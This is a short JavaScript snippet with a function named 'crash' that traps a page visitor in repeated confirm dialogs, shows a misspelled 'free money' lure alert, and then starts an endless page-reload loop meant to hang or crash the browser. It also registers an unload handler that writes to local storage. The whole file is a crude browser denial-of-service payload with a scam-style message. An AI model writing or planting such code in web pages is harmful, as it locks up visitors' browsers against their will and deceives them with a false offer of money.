function crash () {
  onbeforeunload = function(){localStorage.x=1};
  confirm_result = false;

  while (true && !confirm_result) {
    confirm_result = confirm("Press OK");
    if(confirm_result){
      alert("press ok for frea mony");
      setTimeout(function(){
        while(1)location.reload(1)
      }, 1000)
    }
  }
}